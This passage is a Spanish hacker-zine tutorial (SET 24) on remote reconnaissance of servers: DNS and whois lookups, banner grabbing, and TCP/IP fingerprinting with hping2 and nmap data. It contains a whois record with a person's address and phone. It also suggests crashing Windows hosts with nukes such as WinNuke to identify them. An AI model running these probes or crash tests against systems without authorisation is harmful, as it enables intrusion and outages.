@@ -1,0 +1,3299 @@
+-[ 0x0F ]--------------------------------------------------------------------
+-[ Analisis remoto de Sistemas ]---------------------------------------------
+-[ by Honoriak ]------------------------------------------------------SET-24-
+
+
+
+-----------------[ Analisis remoto de sistemas
+
+-----------------[ honoriak <honoriak@mail.ru>
+
+                 [ Seccion de I+D de networking-center.org ]
+
+			   [ Version Final ]
+
+   Indice
+   ======
+
+   1. Introduccion:
+
+	-  Localizacion.
+
+	-  NS de la maquina.
+
+	-  Informacion del registro del dominio.
+
+   2. Analisis:
+
+	- Sistema operativo:
+
+		Analisis sin conocimiento de la pila TCP/IP.
+
+		Analisis basado en la pila TCP/IP.
+
+		Fingerprinting pasivo
+
+	- Servicios:
+
+		Software  de escaneo  de  puertos y  vulnerabilidades:
+		panorama actual.
+
+		Tecnicas usadas en el escaneo de puertos.
+
+	- Relacion de principales servicios con puertos. Daemons.
+
+	- CGIs
+
+   3. Bibliografia y agradecimientos
+
+
+		     |---------------------------------------|
+
+
+   1. Introduccion
+      ============
+
+	Localizacion:
+	~~~~~~~~~~~~~
+
+	En este  manual se tratara  unicamente el caso de  un servidor
+con una ip  fija y un dominio/s asociado, ya que  creo que el analisis
+de sistemas  se aplica a este  tipo de configuraciones y  no me parece
+logico  el  ocuparse de  ordenadores  de  usuarios  domesticos ya  que
+normalmente no son los que necesitan este tipo de comprobaciones.
+
+	Lo unico a resaltar es que las IPs de las maquinas que vamos a
+analizar no pueden estar en ningun caso entre:
+
+     ============================================
+     |	Clase 	Networks	                |
+     |  A       de 10.0.0.0 a 10.255.255.255    |
+     |	B       de 172.16.0.0 a 172.31.0.0      |
+     |  C       de 192.168.0.0 a 192.168.255.0  |
+     ============================================
+
+	Ya  que estas  son de  uso  privado (para  LANs, intranets)  y
+estamos tratando el caso de maquinas conectadas a internet. La version
+del Internet  Protocol utilizada mayormente  en la actualidad es  la 4
+pero es  cierto que  los esfuerzos porque  este sea reemplazado  en un
+futuro no muy lejano por IPv6 es notable y en este cambiara el esquema
+de direcciones y las direcciones seran mas largas.
+
+	Dos  herramientas  de uso  muy  comun  entre  los usuarios  de
+cualquier sistema  operativo serio son  ping y traceroute.   Me parece
+que es  obvio su uso y sino siempre puedes acudir al  man para saber
+todas sus  opciones de sintaxis. La  ultima de ellas,  muchas veces es
+infravalorada  en un analisis  y realmente  puede dar  una idea  de la
+situacion fisica del servidor  y maquinas cercanas a este. Actualmente
+hay  bastantes  frontends  y  utilidades basadas  en  traceroute  para
+x-windows e  incluso alguna de ellas  representa en un  mapa el camino
+que  sigue  un  paquete  desde  nuestro sistema  hasta  la  maquina  a
+analizar.
+
+        Mas  adelante, comentare  el  uso de  traceroute para  conocer
+mejor el tipo de firewall que protege a una maquina.
+
+
+	NS de la maquina
+	~~~~~~~~~~~~~~~~
+
+	Otra  herramienta muy  util  en el  analisis  es el  nslookup,
+gracias a ella  podremos saber el servidor de  nombres (NS) que ofrece
+el dominio a nuestro servidor, es decir, el NS que hace que w.x.y.z sea
+dddd.com. Para  obtener esta informacion,  haremos uso de  nuestro DNS
+(es decir, el servidor de nombres que nos ofrece nuestro ISP). Asi por
+ejemplo, suponiendo  que mi NS es ns1.worldonline.es  y queremos saber
+cual es el NS de insflug.org, se actuaria de la siguiente forma:
+
+$ nslookup insflug.org
+Server:  ns1.worldonline.es
+Address:  212.7.33.3
+
+Name:    insflug.org
+Address:  209.197.122.174
+
+$ nslookup
+Default Server:  ns1.worldonline.es
+Address:  212.7.33.3
+
+> set q=ns
+> insflug.org
+Server:  ns1.worldonline.es
+Address:  212.7.33.3
+
+Non-authoritative answer:
+insflug.org	nameserver = NS0.NS0.COM
+insflug.org	nameserver = NS84.PAIR.COM
+
+Authoritative answers can be found from:
+NS0.NS0.COM	internet address = 209.197.64.1
+NS84.PAIR.COM	internet address = 209.68.1.177
+
+	Como  puedes observar,  hemos obtenido  los NS  tanto primario
+como   secundario   que  hace   que   insflug.org   este  asociado   a
+209.197.122.174 siendo: NS0.NS0.COM  y NS84.PAIR.COM. Esta informacion
+nos puede ser  de gran utilidad para cierto tipo de  cosas.  Lo que si
+que puede ser de cierta utilidad es  saber que en los NS hay unas zone
+files  en  las que  se  encuentra la  informacion  sobre  el dominio  a
+analizar, de esta forma encontrariamos
+
+	      zone "insflug.org"{
+ 	      type master;
+ 	      file "insflug.org.zone";
+ 	 };
+
+	en el fichero en el que se encontrase la informacion sobre las
+secciones  de zona (algunas  veces /var/named/),  siendo la  zone file
+para insflug.org /var/named/insflug.org.zone,  en el supuesto de estar
+en /var/named/.  Alli encontrariamos
+
+	@                 IN	  NS	  NS0.NS0.COM.
+ 	www               IN	  A 	  209.197.122.174
+ 	ftp               IN	  CNAME   www
+			.....
+
+	CNAME significa canonical name  y quiere decir que en realidad
+la  ip  a   la  que  se  refiere  ftp.insflug.org   es  la  misma  que
+www.insflug.org y que  en este caso es la  misma que insflug.org, como
+podemos comprobar haciendo:
+
+$ nslookup
+Default Server:  ns1.worldonline.es
+Address:  212.7.33.3
+
+> set q=ns
+> www.insflug.org
+Server:  ns1.worldonline.es
+Address:  212.7.33.3
+
+Non-authoritative answer:
+www.insflug.org	canonical name = insflug.org
+		...
+
+> ftp.insflug.org
+Server:  ns1.worldonline.es
+Address:  212.7.33.3
+
+ftp.insflug.org	canonical name = insflug.org
+		...
+
+	De  esta  forma,  podremos  saber  si  los  demonios  de  ftp,
+www...  de un dominio  se encuentran  en una  misma maquina  o maquinas
+diferentes; muy util para tener una vision global del host a estudiar,
+ya que  lo que en  principio se podria  pensar que era un  servidor en
+particular  son  varios.  Ademas,  www.insflug.org  por ejemplo  puede
+estar asociado a varias IPs y viceversa.
+
+	Pese a  que para saber el  servidor de nombres  del servidor a
+estudiar hemos utilizado  nslookup, que se supone que  es el metodo en
+el cual  utilizamos un  poco "nuestros propios  medios", estos  NSs se
+podrian saber haciendo uso del comando  que se utiliza en lo que viene
+a continuacion: whois.
+
+
+	Informacion del registro del dominio
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	Para  obtener informacion  sobre  el registro  de un  dominio,
+entiendase  por dominio  ddd.xxx  y no  pr.ddd.xxx pr2.ddd.xxx...  que
+serian considerados subdominios del primero,  se puede hacer uso de la
+herramienta ya implementada  en la mayoria de los  unix whois. Asi, de
+esta forma:
+
+$ whois insflug.org
+[whois.internic.net]
+
+Whois Server Version 1.3
+
+Domain names in the .com, .net, and .org domains can now be registered
+with many different competing registrars. Go to http://www.internic.net
+for detailed information.
+
+   Domain Name: INSFLUG.ORG
+   Registrar: NETWORK SOLUTIONS, INC.
+   Whois Server: whois.networksolutions.com
+   Referral URL: www.networksolutions.com
+   Name Server: NS0.NS0.COM
+   Name Server: NS84.PAIR.COM
+   Updated Date: 24-jun-2000
+
+
+>>> Last update of whois database: Mon, 25 Dec 2000 11:16:57 EST <<<
+
+The Registry database contains ONLY .COM, .NET, .ORG, .EDU domains and
+Registrars.
+
+	Puedes observar como se han obtenido tambien los servidores de
+nombres que  contienen la entrada  insflug.org (por esto  lo comentado
+anteriormente).  Pero, en realidad, esto la mayoria de las veces no es
+de mucha utilidad ya que  actualmente los registros de dominios no son
+directos y en realidad no figura  el nombre del que lo quiso registrar
+sino de  la empresa intermediaria  que hizo efectivo el  registro.  Lo
+que si que nos proporciona una informacion mucho mas completa es hacer
+un whois  al Whois Server que  nos ha proporcionado  este primer whois
+insflug.org que es whois.networksolutions.com, asi de esta forma:
+
+$ whois insflug.org@whois.networksolutions.com
+[whois.networksolutions.com]
+The Data in  Network Solutions' WHOIS database is  provided by Network
+Solutions for information purposes, and to assist persons in obtaining
+information  about or related  to a  domain name  registration record.
+Network Solutions  does not guarantee  its accuracy.  By  submitting a
+WHOIS query,  you agree that  you will use  this Data only  for lawful
+purposes and that,  under no circumstances will you  use this Data to:
+(1) allow,  enable,  or otherwise  support  the  transmission of  mass
+unsolicited,  commercial  advertising   or  solicitations  via  e-mail
+(spam);  or (2)  enable high  volume, automated,  electronic processes
+that apply  to Network Solutions (or its  systems).  Network Solutions
+reserves the right  to modify these terms at  any time.  By submitting
+this query, you agree to abide by this policy.
+
+Registrant:
+Impatient & 'Novatous' Spanish FidoNet Linux Users Group (INSFLUG-DOM)
+   Avda. Pablo VI, 11 - 4C
+   Dos Hermanas, Sevilla 41700
+   ES
+
+   Domain Name: INSFLUG.ORG
+
+   Administrative Contact, Billing Contact:
+      Montilla, Francisco J  (FJM43)  pacopepe@INSFLUG.ORG
+      Impatient & 'Novatous' Spanish FidoNet Linux Users Group
+      Avda. Pablo VI, 11 - 4C
+      Dos Hermanas, Sevilla 41700
+      ES
+      +34 955679066 (FAX) +34 955679066
+   Technical Contact:
+      Administrator, Domain  (DA550)  domain@PAIR.COM
+      pair Networks, Inc
+      2403 Sidney St, Suite 510
+      Pittsburgh, PA 15203
+      +1 412 681 6932 (FAX) +1 412 381 9997
+
+   Record last updated on 25-Jul-2000.
+   Record expires on 24-Jun-2001.
+   Record created on 24-Jun-1998.
+   Database last updated on 25-Dec-2000 20:18:04 EST.
+
+   Domain servers in listed order:
+
+   NS84.PAIR.COM		209.68.1.177
+   NS0.NS0.COM			209.197.64.1
+
+	Vemos pues, una informacion mucho mas completa =) Para obtener
+	informacion sobre dominios que  no sean .com, .net, .org, .edu
+	tendremos que saber el servidor que nos permite hacer un whois
+	de  dicho dominio,  ya que  con el  whois.internic.net  no nos
+	permitira esa busqueda,
+
+$ whois ctv.es
+[whois.internic.net]
+
+Whois Server Version 1.3
+
+Domain names in the .com, .net, and .org domains can now be registered
+with many different competing registrars. Go to http://www.internic.net
+for detailed information.
+
+No match for "CTV.ES".
+
+>>> Last update of whois database: Mon, 25 Dec 2000 11:16:57 EST <<<
+
+The Registry database contains ONLY .COM, .NET, .ORG, .EDU domains and
+Registrars.
+
+
+   2. Analisis
+      ========
+
+
+	2.1 Sistema operativo
+	~~~~~~~~~~~~~~~~~~~~~
+
+		I. Analisis sin conocimientos de la pila TCP/IP
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	De  paquete,  algunos  sistemas operativos  (quizas  versiones
+antiguas),  tenian  o  incluso  tienen "por  costumbre"  darnos  dicha
+informacion   (so  y  version)   al  telnetear   al  servidor   y  los
+administradores no se preocupan de modificarlo. Asi que siempre puedes
+probar haber si hay suerte y por ejemplo te encuentras con:
+
+$ telnet jeropa.com
+Trying 64.60.1.66...
+Connected to jeropa.com.
+Escape character is '^]'.
+
+Cobalt Linux release 4.0 (Fargo)
+Kernel 2.0.34C53_SK on a mips
+
+login:
+		...
+
+	Lo  que  es  cierto,  es  que cualquier  sysadmin  serio  debe
+preocuparse  de  cambiar esto,  ya  que  tampoco  hay que  dar  tantas
+facilidades.  Pero, en la actualidad si que es cierto que cada vez son
+mas los  sysadmins que cambian  esto e incluso  ponen un so  o version
+falsa. Asi que esta tampoco va a ser una muy buena solucion para saber
+el sistema operativo  de la maquina que tratamos.  (El escaner ISS, de
+pago, utiliza esta "fiable" tecnica,  asi que te recomiendo usar queso
+o nmap).
+
+	Aun asi, podemos seguir  obteniendo informacion sobre el SO de
+la  maquina a  estudiar de  forma  mas o  menos parecida  ya que,  por
+ejemplo, si tiene operativo www, ftp o snmp, a lo mejor se puede hacer
+una peticion  al servidor web,  ejecutar SYST en  una sesion de  FTP o
+simplemente ver la version del cliente  de FTP o usar snmpwalk (de las
+utilidades CMU SNMP) para conseguir cierta informacion respectivamente
+y saber en algunos casos el SO; de esta forma, por ejemplo:
+
+$ telnet www.microsoft.com 80
+Trying 207.46.230.229...
+Connected to www.microsoft.akadns.net.
+Escape character is '^]'.
+probando?
+HTTP/1.1 400 Bad Request
+Server: Microsoft-IIS/5.0
+Date: Wed, 27 Dec 2000 00:03:18 GMT
+                ...
+
+        Te suena de  algo lo de IIS/5.0? Pues ya sabes hablamos de un
+win*.
+
+  __
+
+$ telnet ftp.ciudadfutura.com 21
+Trying 216.35.70.14...
+Connected to ftp.ciudadfutura.com.
+Escape character is '^]'.
+220 Serv-U FTP-Server v2.5e for WinSock ready...
+			...
+
+	Y  por  tanto  si  revisamos las  caracteristicas  del  Serv-U
+	FTP-Server,
+
+	| "FTP Serv-U from is a full-featured
+	| FTP server that allows you to turn almost any
+	| MS  Windows (9x, NT, 2000) computer into an
+	| Internet FTP Server."
+
+	nos damos cuenta de que estamos hablando de una maquina win*.
+
+
+		II Analisis basado en la pila TCP/IP
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	Antes de pasar a enumerar  los programas que han hecho posible
+el reconocimiento del sistema operativo  de un host de forma remota me
+parece logico  explicar, a grandes rasgos, cual  es su funcionamiento,
+sin entrar de momento en particularidades.
+
+	Dichos  programas  basan  su  funcionamiento en  analizar  las
+diferentes  respuestas  que ofrecen  distintos  sistemas ante  ciertos
+envios  (he aqui  las singularidades  y la  variedad de  metodos). Por
+tanto,  dichas respuestas,  que son  comunmente conocidas  como TCP/IP
+fingerprints, son las que  permiten distinguir un sistema operativo de
+otro.  Muchas veces, recurren  dichos programas  a distintos  tipos de
+envios ya que, en muchas  ocasiones, las diferencias en la pila TCP/IP
+de un  sistema operativo  a otro  no son muy  marcadas y  ante ciertos
+envios actuan de igual forma,  diferenciandose, a veces, solo en uno o
+incluso no habiendo  diferencia (como en el caso  de Windows 95/98/NT,
+en los que increiblemente no se observa un comportamiento diferente en
+sus  pilas TCP/IP;  unicamente probando  nukes contra  dichos  hosts y
+viendo si se caen o no, para  asi distinguir por ejemplo entre un 95 y
+un 98 (ej. WinNuke)).
+
+	Entre los programas disponibles  que utilizan dicha tecnica de
+fingerprinting destacan:
+
+	-spoofer para IRC sirc (Johan)
+	-checkos (shok)
+	-nmap (fyodor)
+	-nsat (mixter)
+	-p0f (Michal Zalewski)
+	-SS (Su1d)
+	-queso (savage)
+
+	Ya entrando mas a fondo  en el funcionamiento a mas bajo nivel
+de dichos programas encontramos  cierta diferencia entre ellos, ya que
+mientras unos  usan un fichero externo con  fingerprints de diferentes
+sistemas  tipo, como  el  queso,  otros incluyen  en  el codigo  dicha
+comparacion, como checkos por ejemplo.
+
+	En checkos encontramos:
+
+			...
+
+	if ((tcp.hrc & CF_SYN) && (tcp.hrc & CF_FIN)) {
+          type=OS_LINUX;
+          done=1;
+        }
+			...
+
+	if ((tcp.hrc & CF_ACK) && (tcp.hrc & CF_RST)) {
+          if (flags & OSD_WIN95WAIT) {
+            done=1;
+            type=OS_WIN95;
+          }
+
+
+	En ss encontramos:
+
+			   /*  fragmento  codigo de  ss  de Remote  OS
+			   Detection  via   TCP/IP  Fingerprinting  de
+			   Fyodor */
+
+			...
+
+	if ((flagsfour & TH_RST) && (flagsfour & TH_ACK) && (winfour == 0) &&
+   	   (flagsthree & TH_ACK))
+       		reportos(argv[2],argv[3],"Livingston Portmaster ComOS");
+
+			...
+
+	Mientras que en queso  encontramos un fichero de configuracion
+en el que se distingue por ejemplo:
+
+
+	$ cat /etc/queso.conf
+	...
+	* AS/400 OS/400 V4R2 (by rodneybrown@pmsc.com)
+	0 1 1 1 SA
+	1 0 1 0 R
+	2 0 1 0 RA
+	3 0 1 0 R
+	4 1 1 1 SA
+	5 0 1 0 RA
+	6 1 1 1 SA
+	...
+
+	Se observa, pues, que savage ha implementado de forma bastante
+mas inteligente  dicha idea. Este  metodo ha sido heredado  por fyodor
+para su nmap, y por ejemplo, en ciertas versiones de nmap encontramos:
+
+	$ cat /usr/local/lib/nmap/nmap-os-fingerprints
+	...
+	# Thanks to Juan Cespedes <cespedes@lander.es>
+	FingerPrint  AGE Logic, Inc. IBM XStation
+	TSeq(Class=64K)
+	T1(DF=N%W=2000%ACK=S++%Flags=AS%Ops=M)
+	T2(Resp=N)
+	T3(Resp=Y%DF=N%W=2000%ACK=O%Flags=A%Ops=)
+	T4(DF=N%W=2000%ACK=O%Flags=R%Ops=)
+	T5(DF=N%W=0%ACK=S++%Flags=AR%Ops=)
+	T6(DF=N%W=0%ACK=O%Flags=R%Ops=)
+	T7(DF=N%W=0%ACK=S%Flags=AR%Ops=)
+	PU(DF=N%TOS=0%IPLEN=38%RIPTL=148%RID=F%RIPCK=0%UCK=E%ULEN=134%DAT=E)
+	...
+
+	Y tambien ha  sido usado por mixter en  su NSAT, destacando la
+distincion que hace entre diferentes configuraciones de windows:
+
+	$ cat /usr/local/bin/nsat.os
+	...
+	Windows (Firewall-1)
+	1 1 1 0 1 18
+	1 0 1 0 0 4
+	1 0 1 0 1 21
+	1 0 1 0 1 21
+	1 1 1 0 1 18
+	1 0 1 0 1 28
+	0 0 0 0 0 0
+	...
+
+	En  lo  que  se  refiere  al  tipo  de  tecnicas  usadas  para
+diferenciar  unos  OSs se  debe  puntualizar  que  en realidad,  estas
+pruebas  se   combinan,  para   asi  conseguir  aislar   cada  sistema
+operativo. Un muy buen programa para  hacer este tipo de pruebas es el
+hping2  (antirez@invece.org, http://www.kyuzz.org/antirez/hping2.html)
+o    sing   (aandres@mfom.es,   http://sourceforge.net/projects/sing/)
+combinandolo con el analisis mediante tcpdump o ethereal (un magnifico
+frontend), ya que  aunque puedes realizar tu propio  codigo (en C, por
+ejemplo)  esta claro  que  esto conlleva  unos  conocimientos de  unix
+network  programing  bastante  importantes,  asi  que  en  este  paper
+analizare los  resultados obtenidos con  hping2 y no  presentare codes
+especificos para cada prueba,  ademas utilizare mi propia maquina para
+dichas pruebas  y no lo hare de  forma remota para asi  tener un mayor
+control de  los resultados. Los  metodos que conozco son:  (si conoces
+otras  tecnicas   utilizadas  para  esto  no  dudes   en  decirmelo  -
+honoriak@mail.ru)
+
+
+	- TCP ISN: Cuando el host a analizar responde a solicitudes de
+conexion, genera  unos numeros  en la secuencia  inicial (ISN)  que no
+siempre  se producen  de la  misma  forma; esto,  es aprovechado  para
+distinguir unos  sistemas de otros.  Estos ISNs  pueden ser constantes
+(hubs de 3com, etc.), 64K (UNIX antiguos), aleatorios (linux >2.0, AIX
+modernos,  OpenVMS), incremento  en funcion  del tiempo  (windows), de
+incremento   aleatorio   (freebsd,   digital   unix,   cray,   solaris
+modernos...)  siendo estos ultimos  incrementos basados  en diferentes
+cosas como por ejemplo maximos comunes divisores.
+         Si enviamos varios paquetes, por ejemplo, de la forma:
+
+	 $ hping2 localhost -p 80
+	 default routing not present
+	 HPING localhost (lo 127.0.0.1): NO FLAGS are set, 40 headers + 0 data
+	 bytes
+	 40 bytes from 127.0.0.1: flags=RA seq=0 ttl=255 id=5 win=0 rtt=0.4 ms
+	 40 bytes from 127.0.0.1: flags=RA seq=1 ttl=255 id=6 win=0 rtt=24.9 ms
+
+	 --- localhost hping statistic ---
+	 2 packets tramitted, 2 packets received, 0% packet loss
+	 round-trip min/avg/max = 0.4/12.6/24.9 ms
+
+	 Y ahora analizamos dichos paquetes por ejemplo con el tcpdump
+(mas claro  son los resultados  que ofrece ethereal, pero  para copiar
+aqui es mas comoda la salida del tcpdump; solo copiare las respuestas,
+no las peticiones)
+
+	...
+	14:12:47.774380   lo < honorato.2485 > honorato.www: . 7200421:72
+	00421(0) win 512
+	...
+	14:12:48.771779   lo < honorato.2486 > honorato.www: . 2002659674:200
+	2659674(0) win 512
+	...
+
+	Se observa, pues, una variacion  en la seq inicial del paquete
+TCP, en  el primer  paquete vemos 7200421  y en el  segundo 2002659674
+siendo en  este caso completamente aleatorios ya  que estoy trabajando
+en:
+
+	$  uname -a
+	Linux  honorato.com  2.2.16 #14  SMP  Sat Jun  10 15:51:08 CEST 2000
+	i86 unknown
+
+	- Opciones  de TCP:  esta tecnica  se basa  en  el diferenciar
+sistemas operativos segun  el numero de opciones TCP  que admiten, los
+valores  de dichas  opciones y  el orden  en que  las opciones  se nos
+presentan.  Esto, que yo sepa, solo es utilizado por Nmap (si sabes de
+otros programas que lo usen, no dudes en decirmelo y modificare esto).
+
+        Fyodor en su nmap hace prueba las siguientes opciones:
+
+Window Scale=10; NOP; Max Segment Size = 265; Timestamp; End of Ops;
+
+        El hping2 no implementa esta posibilidad (o eso creo) asi que
+no lo he llevado a la practica. Siempre puedes analizar el codigo del
+nmap que realiza esto y heredar dicha tecnica.
+
+
+	- FIN: Se  basa en  el envio  a un puerto  abierto del  host a
+estudio de  un paquete  FIN o cualquiera  que no  tenga un flag  ACK o
+SYN. Segun el RFC793 el host no tendria que responder pero algunos OSs
+responden con un RESET como Windows, HP/UX, IRIX, MVS, BSDI, CISCO.
+
+	Para hacer una prueba practica  usare el puerto 80, con apache
+arrancado:
+
+	$ /usr/bin/httpd
+	$ hping2 localhost -p 80 -F
+	default routing not present
+	HPING localhost (lo 127.0.0.1): F set, 40 headers + 0 data bytes
+
+	--- localhost hping statistic ---
+	4 packets tramitted, 0 packets received, 100% packet loss
+	round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+        Se observa pues, como mi linux si que cumple el RFC793 y no responde 
+        a dichos paquetes.
+
+	- ACK recibido:  El valor de ACK  que nos envia  el servidor a
+analizar cuando  por ejemplo enviamos  un SYN|FIN|URG|PSH a  un puerto
+abierto o un FIN|PSH|URG a  un puerto cerrado puede variar respecto al
+numero de secuencia inicial que envia este.
+
+	Para  probar,  inicialmente mandare  un  paquete  normal a  un
+puerto cerrado, y se comprueba que el valor de ACK no cambia y despues
+uno FIN|PSH|URG tambien a un puerto cerrado y se vera como cambia:
+
+	$ killall httpd
+	$ hping2 localhost -p 80
+	...
+
+	y en la salida del tcpdump se ve
+
+	15:59:37.442157   lo > honorato.1676 > honorato.www: . 1752870898:1752
+	870898(0) win 512
+	15:59:37.442157   lo < honorato.1676 > honorato.www: . 1752870898:1752
+	870898(0) win 512
+	15:59:37.442259   lo > honorato.www > honorato.1676: R 0:0(0) ack 1752
+	870898 win 0
+
+	vemos como 1752870898 se mantiene en el ack, pero en cambio:
+
+	$ hping2 localhost -p 80 -S -F -U -P
+	...
+
+	y en la salida del tcpdump ahora vemos
+
+	16:00:48.480252   lo > honorato.2669 > honorato.www: SFP 1376153753:13
+	76153753(0) win 512 urg 0
+	16:00:48.480252   lo < honorato.2669 > honorato.www: SFP 1376153753:13
+	76153753(0) win 512 urg 0
+	16:00:48.480334   lo > honorato.www > honorato.2669: R 0:0(0) ack 1376
+	153754 win 0
+
+	Se ve pues como ha cambiado el valor de seq respecto al de ack
+de 1376153753 a 1376153754.
+	De  la  misma forma,  haciendo  dicha  prueba  para un  puerto
+abierto se puede ver que hay una variacion.  En estas pruebas he usado
+linux, pero de un sistema a otro esa variacion puede ser diferente (lo
+que permite diferenciarlos, claro esta).
+
+
+	- Flag TCP  (64/128) en el  encabezado TCP de un  paquete SYN:
+Haciendo  esto, por  lo que  yo he  probado/leido unicamente  el linux
+2.0.35  mantiene dicha  flag en  la respuesta  y el  resto  cancela la
+conexion.  Esto, de estudiarse  a fondo, puede servir para diferenciar
+OSs.
+
+	No he hecho una demostracion  practica de dicho metodo, ya que
+en este momento no tengo  instalado el kernel 2.0.35, pero simplemente
+se haria:  hping2 localhost -p 80  -S y se  analizarian los resultados
+vertidos por el tcpdump.
+
+
+	- ICMP:
+
+	1) Esta  tecnica se basaria  en el control del  numero de
+mensajes de destination  unreachable que envia un host  por ejemplo al
+mandar  un  gran  numero de  paquetes  a  un  puerto UDP.   En  linux,
+encontramos como limita dicha cantidad de mensajes, y por ejemplo:
+
+	$ cat /usr/src/linux/net/ipv4/icmp.c
+	...
+	*  4.3.2.8 (Rate Limiting)
+	*   SHOULD be able to limit error message rate (OK)
+	*   SHOULD allow setting of rate limits (OK, in the source)
+	...
+
+        Pero, esta tecnica es de dificil implementacion, ya que habria
+que considerar la posibilidad de que los paquetes se perdiesen.
+
+	$ hping2 localhost --udp -i u[intervalo_en_microsegundos]
+	...
+	--- localhost hping statistic ---
+	*** packets tramitted, * packets received, ***% packet loss
+	round-trip min/avg/max = *.*/*.*/*.* ms
+
+	Y se analizaria  si limita o no el numero  de paquetes de ICMP
+Port Unreachable. Pero, no hago la  prueba con mi localhost ya que las
+condiciones  son completamente  diferentes  a las  condiciones que  te
+encontrarias en internet. Aun  asi, veo de dificil implementacion esta
+tecnica por lo dicho anteriormente.
+
+	2) Basandose en  los mensajes de error ICMP,  y centrandose en
+los mensajes que se refieren a  que no se pudo alcanzar un puerto casi
+todos los OSs mandan simplemente  el encabezado ip y ocho bytes; pero,
+tanto solaris como linux mandan una respuesta un poco mas larga siendo
+este ultimo  el que  responde con mayor  numero de bytes.  Esto, claro
+esta, puede ser utilizado para distinguir unos OSs de otros.
+
+        $ hping2 localhost --udp -p 21
+
+	y  si  analizamos uno  de  los  paquetes  ICMP de  Destination
+unreachable observamos:
+
+	Header length: 20 bytes
+	Protocol: ICMP (0x01)
+	Data (28 bytes)
+	Type: 3 (Destination unreachable)
+	Code: 3 (Port unreachable)
+
+	se observa  pues como en sistemas linux  ademas del encabezado
+ip se retornan bastante mas de 8 bytes, 28 bytes.
+
+        3) Fijandose nuevamente en los mensajes de error ICMP debido a
+que no  se pudo  alcanzar un puerto,  se observa  que todos los  OSs a
+excepcion de  linux usa como valor  de TOS (tipo de  servicio) 0, pero
+linux en  cambio, usa 0xc0  siendo esto parte  de  AFAIK, el  campo de
+referencia, que no es usado.
+
+	$ hping2 localhost --udp -p 21
+
+	y en el tcpdump, por ejemplo, observamos la siguiente salida:
+
+	16:27:57.052282   lo > honorato > honorato: icmp: honorato udp port fs
+	p unreachable [tos 0xc0]
+	16:27:57.052282   lo < honorato > honorato: icmp: honorato udp port fs
+	p unreachable [tos 0xc0]
+
+	siendo el tos  0xc0 como he expuesto anteriormente,  ya que se
+trata de un linux, a diferencia de los demas sistemas operativos.
+
+	4) Basandose en los encabezados  de los paquetes ICMP de error
+vemos como diferentes OSs lo utilizan como 'scratch space'.  Es decir,
+lo  modifican; y asi  por ejemplo  encontramos como  freebsd, openbsd,
+ultrix... cambian el ID de la IP del mensaje original en su respuesta,
+bsdi aumenta en  20 bytes la longitud total del campo  de IP... (y hay
+mas diferencias, que estan por analizar, asi que ya sabes).
+
+	En mi linux, por ejemplo, el un paquete udp al puerto 0 es:
+
+0000  00 00 08 00 45 00 00 1c  a4 c8 00 00 40 11 d8 06   ....E... ....@...
+0010  7f 00 00 01 7f 00 00 01  0a e5 00 00 00 08 f6 f6   ........ ........
+
+        y su el paquete ICMP de Destination unreachable es:
+
+0000  00 00 08 00 45 c0 00 38  22 de 00 00 ff 01 9a 24   ....E..8 "......$
+0010  7f 00 00 01 7f 00 00 01  03 03 fb 18 00 00 00 00   ........ ........
+0020  45 00 00 1c a4 c8 00 00  40 11 d8 06 7f 00 00 01   E....... @.......
+0030  7f 00 00 01 0a e5 00 00  00 08 f6 f6               ........ ....
+
+        En linux, el campo de la  IP, no varia del paquete udp al icmp
+de error  a diferencia de  otros SOs pero  pasa de tener id:  0xa4c8 a
+tener id:  0x22de. Este metodo  no lo he  estudiado a fondo y  veo que
+puede tener  bastantes particularidades.  Si quieres  tener una vision
+un poco mas  completa del escaneo de puertos  mediante metodos basados
+en  ICMP  puedes  leer  ICMP  usage  in  scanning  o  tambien  llamado
+Understanding some  of the  ICMP Protocol's Hazards  de Ofir  Arkin de
+Sys-security Group en http://www.sys-security.com.
+
+
+	5) Esta   tecnica  solo  puede   ser  usada,   en  plataformas
+unix/linux/bsd y no  en win* ya que win no responde  a las queries que
+seran usadas,  que son de ICMP  tipo 13 o tambien  conocidas como ICMP
+Timestamp Request.
+
+	En el  caso del sistema operativo  linux, que es  el que poseo
+podemos observar la siguiente prueba:
+
+	$ sing -vv -tstamp 127.0.0.1 ...
+
+	del que  se obtendra un  tiempo de respuesta de  timestamp que
+puede ser utilizado para diferenciar unos OSs de otros.
+
+
+        6) Esta tecnica se basa  en el funcinamiento especifico de los
+routers.
+
+        En particular,  se basa en  ICMP Router Solicitation  (ICMP de
+tipo 10). Cada  router 'multicastea' cada cierto tiempo  un anuncio de
+ruta (ICMP de tipo 9) desde cada una de sus interfaces de 'multicast',
+y de esta forma anuncia la direccion IP del interfaz.
+
+	Si vemos que el host remoto responde con ICMP de tipo 9 frente
+a un ICMP de tipo 10,  entonces nos encontramos ante un router.  Pero,
+los  routers  que  tengan   suprimida  esta  caracteristica  no  seran
+detectados.
+
+	Las  pruebas para este  metodo las  puedes realizar  tanto con
+hping2 como con sing (antiguo  icmpush), pero el ultimo fue el primero
+en implementarla, y asi encontramos:
+
+	$ sing -rts 127.0.0.1
+	...
+	$ hping2 -C 10 127.0.0.1
+	...
+
+
+	- Bit  no fragmentado:  esta tecnica  se basa  en  que ciertos
+sistemas operativos  ponen un bit no  fragmentado de IP  en algunos de
+los paquetes  que envian.  Pero lo que  es cierto  es que no  todos lo
+hacen, y de  hacerlo no lo hacen  de la misma forma; lo  que puede ser
+aprovechado para averiguar el OS.
+
+	en mi  linux (del que  ya he copiado  un uname -a  antes, para
+saber el kernel que uso):
+
+	$ hping2 localhost
+	...
+
+	al analizar uno  de los paquetes tcp mandados  con ethereal se
+comprueba que:
+
+	Flags: 0x04
+	       .1.. = Don't Fragment: Set
+	       ..0. = More fragments: Not set
+
+	pero, tampoco he hecho un gran numero de pruebas para asegurar
+que en  algun caso y con cierto  tipo de paquetes no  se adjunte dicho
+bit.  Aun asi, hay OSs que nunca lo usan como SCO o OpenBSD.
+
+
+	- La ventana inicial de TCP: se basa en la comprobacion de las
+dimensiones de la  ventana de los paquetes que nos  devuelve el host a
+estudiar. El  valor que toma es  casi siempre igual  para cada sistema
+operativo, he incluso hay sistemas que se pueden identificar por medio
+de este  metodo, ya que son los  unicos que le asignan  cierto valor a
+dicha ventana (ej. AIX, 0x3F25).
+
+	En  lo que  se refiere  a  sistemas linux,  freebsd o  solaris
